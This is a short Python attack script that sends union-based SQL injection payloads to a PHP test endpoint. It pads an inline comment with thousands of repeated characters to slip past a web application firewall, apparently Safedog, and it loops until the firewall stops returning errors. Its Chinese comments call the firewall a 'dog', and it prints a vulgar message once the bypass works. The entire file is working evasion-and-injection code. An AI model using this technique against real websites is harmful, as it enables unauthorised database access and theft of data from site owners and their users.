import requests
url = "http://xx.xx.x.x/sqltest.php"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
}
try:
    for i in range(2000,5000):
        st = "/*"+"ABC"*i+"*/ union select user(),2"
        data={
             "id":"1' %s " %st
            }
        print(i)
        res= requests.post(url,headers=headers,data=data).text
        # print(data)
        print(res)

        if '500' not in res:
            # 如果有狗就会返回500
            print(data)
            print('fuck dog')
            # print(res)
            break
except:
    print('终止执行')
